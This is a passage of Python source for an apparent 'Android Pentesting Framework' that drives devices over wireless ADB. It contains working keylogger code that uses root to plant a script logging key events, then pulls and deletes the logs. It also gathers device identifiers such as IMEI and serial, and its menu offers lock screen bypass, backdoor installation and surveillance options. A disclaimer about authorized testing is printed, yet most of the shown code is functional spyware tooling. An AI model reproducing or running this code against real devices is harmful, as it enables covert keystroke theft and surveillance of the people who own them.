            script = '''#!/system/bin/sh
while true; do
    getevent -l | grep -i key >> /sdcard/keylog.txt
    sleep 0.1
done'''
            
            self.run_command("shell su -c 'echo \"#!/system/bin/sh\" > /data/local/tmp/keylogger.sh'")
            self.run_command(f"shell su -c 'echo \"{script}\" >> /data/local/tmp/keylogger.sh'")
            self.run_command("shell su -c 'chmod 755 /data/local/tmp/keylogger.sh'")
            
            print(Config.colorize("Keylogger installed", "GREEN"))
            return {"success": True}
        
        elif choice == "2":
            self.run_command("shell su -c '/data/local/tmp/keylogger.sh &'")
            print(Config.colorize("Keylogger started", "GREEN"))
            return {"success": True}
        
        elif choice == "3":
            self.run_command("shell su -c 'pkill -f keylogger.sh'")
            print(Config.colorize("Keylogger stopped", "GREEN"))
            return {"success": True}
        
        elif choice == "4":
            # Retrieve logs
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            local_path = Config.BACKUP_DIR / f"keylog_{timestamp}.txt"
            
            self.run_command(f"pull /sdcard/keylog.txt {local_path}")
            
            if local_path.exists():
                with open(local_path, 'r') as f:
                    logs = f.read()
                    print(f"\nKey logs:\n{logs[:1000]}...")
                
                print(Config.colorize(f"Logs saved to: {local_path}", "GREEN"))
                return {"success": True, "file": str(local_path)}
        
        elif choice == "5":
            self.run_command("shell su -c 'rm /data/local/tmp/keylogger.sh'")
            self.run_command("shell su -c 'rm /sdcard/keylog.txt'")
            print(Config.colorize("Keylogger uninstalled", "GREEN"))
            return {"success": True}
        
        return {"success": False}
    
    def vulnerability_scan(self):
        """Scan for vulnerabilities"""
        if not self.current_device:
            print(Config.colorize("No device connected", "RED"))
            return {"success": False}
        
        print(Config.colorize("\n[VULNERABILITY SCANNER]", "HEADER"))
        
        vulns = [
            {
                "name": "ADB Debug Enabled",
                "check": "settings get global adb_enabled",
                "condition": lambda x: x == "1",
                "severity": "MEDIUM"
            },
            {
                "name": "USB Debug Enabled",
                "check": "getprop ro.debuggable",
                "condition": lambda x: x == "1",
                "severity": "MEDIUM"
            },
            {
                "name": "Unknown Sources Allowed",
                "check": "settings get secure install_non_market_apps",
                "condition": lambda x: x == "1",
                "severity": "MEDIUM"
            },
            {
                "name": "Developer Options Enabled",
                "check": "settings get global development_settings_enabled",
                "condition": lambda x: x == "1",
                "severity": "LOW"
            },
            {
                "name": "Android Version",
                "check": "getprop ro.build.version.sdk",
                "condition": lambda x: int(x) < 23,  # Android 6.0
                "severity": "HIGH"
            },
            {
                "name": "Security Patch",
                "check": "getprop ro.build.version.security_patch",
                "condition": lambda x: datetime.strptime(x, "%Y-%m-%d") < datetime(2020, 1, 1),
                "severity": "HIGH"
            }
        ]
        
        print("Scanning for vulnerabilities...")
        found = []
        
        for vuln in vulns:
            try:
                result = self.run_command(f"shell {vuln['check']}")
                if result and result.returncode == 0:
                    output = result.stdout.strip()
                    if vuln['condition'](output):
                        found.append({
                            "name": vuln["name"],
                            "severity": vuln["severity"],
                            "details": output
                        })
                        
                        color = "RED" if vuln["severity"] == "HIGH" else "YELLOW" if vuln["severity"] == "MEDIUM" else "BLUE"
                        print(Config.colorize(f"  [{vuln['severity']}] {vuln['name']}: {output}", color))
            except:
                pass
        
        if not found:
            print(Config.colorize("  No vulnerabilities found", "GREEN"))
        
        # Save results
        scan_file = Config.LOG_DIR / f"vuln_scan_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(scan_file, 'w') as f:
            json.dump(found, f, indent=2)
        
        print(f"\nScan results saved to: {scan_file}")
        return {"success": True, "vulnerabilities": found}
    
    def system_info(self):
        """Get system information"""
        if not self.current_device:
            print(Config.colorize("No device connected", "RED"))
            return {"success": False}
        
        print(Config.colorize("\n[SYSTEM INFORMATION]", "HEADER"))
        
        commands = [
            ("Model", "getprop ro.product.model"),
            ("Brand", "getprop ro.product.brand"),
            ("Device", "getprop ro.product.device"),
            ("Android Version", "getprop ro.build.version.release"),
            ("SDK Version", "getprop ro.build.version.sdk"),
            ("Build ID", "getprop ro.build.id"),
            ("Security Patch", "getprop ro.build.version.security_patch"),
            ("Kernel", "uname -a"),
            ("Serial", "getprop ro.serialno"),
            ("IMEI", "service call iphonesubinfo 1"),
            ("WiFi MAC", "cat /sys/class/net/wlan0/address"),
            ("IP Address", "ip addr show wlan0"),
            ("Storage", "df -h /data"),
            ("Memory", "cat /proc/meminfo | grep MemTotal"),
            ("Battery", "dumpsys battery | grep level"),
            ("CPU", "cat /proc/cpuinfo | grep processor | wc -l")
        ]
        
        info = {}
        for name, cmd in commands:
            result = self.run_command(f"shell {cmd}")
            if result and result.returncode == 0:
                output = result.stdout.strip()[:200]
                info[name] = output
                print(f"{name:<20}: {output}")
        
        # Save to file
        info_file = Config.LOG_DIR / f"system_info_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(info_file, 'w') as f:
            json.dump(info, f, indent=2)
        
        print(f"\nInformation saved to: {info_file}")
        return {"success": True, "info": info}
    
    def port_forwarding(self):
        """Forward device ports"""
        if not self.current_device:
            print(Config.colorize("No device connected", "RED"))
            return {"success": False}
        
        print(Config.colorize("\n[PORT FORWARDING]", "HEADER"))
        
        print("Current forwards:")
        self.run_command("forward --list")
        
        print("\n1. Add port forward")
        print("2. Remove port forward")
        print("3. List all forwards")
        
        choice = input("\nChoice (1-3): ").strip()
        
        if choice == "1":
            local_port = input("Local port: ").strip()
            remote_port = input("Remote port: ").strip()
            
            self.run_command(f"forward tcp:{local_port} tcp:{remote_port}")
            print(Config.colorize(f"Forward added: localhost:{local_port} -> device:{remote_port}", "GREEN"))
            return {"success": True}
        
        elif choice == "2":
            self.run_command("forward --remove-all")
            print(Config.colorize("All forwards removed", "GREEN"))
            return {"success": True}
        
        elif choice == "3":
            self.run_command("forward --list")
            return {"success": True}
        
        return {"success": False}
    
    # ============================================================================
    # MAIN MENU
    # ============================================================================
    
    def show_menu(self):
        """Display main menu"""
        while True:
            print("\n" + "="*70)
            print(Config.colorize("ANDROID PENTESTING FRAMEWORK - WIRELESS EDITION", "HEADER"))
            print("="*70)
            
            # Current device status
            if self.current_device:
                device_str = f"{self.current_device.ip_address}:{self.current_device.port}"
                root_str = "✓" if self.current_device.root_access else "✗"
                print(f"Device: {device_str} | Root: {root_str} | Model: {self.current_device.model}")
            else:
                print(Config.colorize("No device connected", "YELLOW"))
            
            print("\n" + "-"*70)
            print(Config.colorize("[CONNECTION]", "BLUE"))
            print("  1. Connect to device (IP:PORT)")
            print("  2. Network scanner (find devices)")
            print("  3. Disconnect current device")
            print("  4. List connected devices")
            
            print(Config.colorize("\n[EXPLOITATION]", "BLUE"))
            print("  5. Lock screen bypass")
            print("  6. Vulnerability scanner")
            print("  7. Install backdoor")
            print("  8. Keylogger")
            
            print(Config.colorize("\n[SURVEILLANCE]", "BLUE"))
            print("  9. Screen mirroring")
            print(" 10. Screen recording")
            print(" 11. Take screenshot")
            print(" 12. WiFi control")
            
            print(Config.colorize("\n[FORENSICS]", "BLUE"))
            print(" 13. File extraction")
            print(" 14. App manager")
            print(" 15. System information")
            
            print(Config.colorize("\n[UTILITIES]", "BLUE"))
            print(" 16. Interactive shell")
            print(" 17. Port forwarding")
            print(" 18. Reboot device")
            
            print("\n 99. Exit framework")
            print("-"*70)
            
            choice = input("\nSelect option: ").strip()
            
            if choice == "1":
                self.connect_device()
            
            elif choice == "2":
                self.network_scan()
            
            elif choice == "3":
                self.disconnect_device()
            
            elif choice == "4":
                devices = self.adb.list_connected()
                if devices:
                    print("\nConnected devices:")
                    for device in devices:
                        print(f"  {device}")
                else:
                    print("No devices connected")
            
            elif choice == "5":
                self.lock_bypass()
            
            elif choice == "6":
                self.vulnerability_scan()
            
            elif choice == "7":
                self.install_backdoor()
            
            elif choice == "8":
                self.keylogger()
            
            elif choice == "9":
                self.screen_mirror()
            
            elif choice == "10":
                self.screen_record()
            
            elif choice == "11":
                self.take_screenshot()
            
            elif choice == "12":
                self.wifi_control()
            
            elif choice == "13":
                self.extract_files()
            
            elif choice == "14":
                self.app_manager()
            
            elif choice == "15":
                self.system_info()
            
            elif choice == "16":
                self.interactive_shell()
            
            elif choice == "17":
                self.port_forwarding()
            
            elif choice == "18":
                if self.current_device:
                    confirm = input("Reboot device? (y/n): ").lower()
                    if confirm == 'y':
                        self.run_command("reboot")
                        print("Device rebooting...")
                else:
                    print("No device connected")
            
            elif choice == "99":
                self.exit_framework()
                break
            
            else:
                print("Invalid option")
            
            input("\nPress Enter to continue...")
    
    def exit_framework(self):
        """Exit the framework"""
        print("\n" + "="*70)
        print(Config.colorize("Thank you for using Android Pentesting Framework", "GREEN"))
        print("Remember: Use only for authorized security testing")
        print("="*70)
        
        if self.current_device:
            disconnect = input("\nDisconnect from device? (y/n): ").lower()
            if disconnect == 'y':
                self.disconnect_device()
        
        sys.exit(0)

# ============================================================================
# COMMAND LINE INTERFACE
# ============================================================================

def main():
    """Main entry point"""
    parser = argparse.ArgumentParser(
        description="Android Pentesting Framework - Wireless Edition",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s                           # Interactive mode
  %(prog)s --connect 192.168.1.100   # Connect to device
  %(prog)s --scan                    # Scan network for devices
  %(prog)s --module screen_mirror    # Run specific module
  %(prog)s --adb /path/to/adb        # Custom ADB path
        """
    )
    
    parser.add_argument("-c", "--connect", help="Connect to device by IP address")
    parser.add_argument("-s", "--scan", action="store_true", help="Scan network for devices")
    parser.add_argument("-m", "--module", help="Run specific module")
    parser.add_argument("-a", "--adb", default="adb", help="Path to ADB binary")
    parser.add_argument("-v", "--verbose", action="store_true", help="Verbose output")
    parser.add_argument("--no-warning", action="store_true", help="Skip warning")
    
    args = parser.parse_args()
    
    # Show warning
    if not args.no_warning:
        warning = """
╔══════════════════════════════════════════════════════════╗
║                       WARNING                            ║
╠══════════════════════════════════════════════════════════╣
║ This tool is for AUTHORIZED SECURITY TESTING only       ║
║ Use only on devices you own or have explicit permission  ║
║ to test. The authors are not responsible for any        ║
║ unauthorized use.                                        ║
╚══════════════════════════════════════════════════════════╝
        
Do you understand and accept these terms? (yes/no): """
        
        print(Config.colorize(warning, "RED"))
        response = input().strip().lower()
        
        if response != "yes":
            print("Exiting...")
            sys.exit(0)
    
    # Create framework instance
    framework = AndroidPentestFramework(adb_path=args.adb, verbose=args.verbose)
    
    # Check ADB
    try:
        subprocess.run([args.adb, "version"], capture_output=True, check=True)
    except:
        print(Config.colorize("ERROR: ADB not found or not working", "RED"))
        print(f"Check if ADB is installed and in PATH, or specify with --adb")
        sys.exit(1)
    
    # Network scan mode
    if args.scan:
        framework.network_scan()
        return
    
    # Module execution mode
    if args.module:
        if args.connect:
            framework.connect_device(args.connect)
        
        if framework.current_device:
            if args.module in framework.modules:
                module = framework.modules[args.module]
                print(f"Running module: {module['name']}")
                result = module['function']()
                print(f"Result: {result}")
            else:
                print(f"Module not found: {args.module}")
                print(f"Available modules: {', '.join(framework.modules.keys())}")
        else:
            print("Not connected to device. Use --connect first")
        return
    
    # Connect to device
    if args.connect:
        framework.connect_device(args.connect)
    
    # Interactive mode
    framework.show_menu()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\nInterrupted by user")
        sys.exit(0)
    except Exception as e:
        print(f"\nFatal error: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)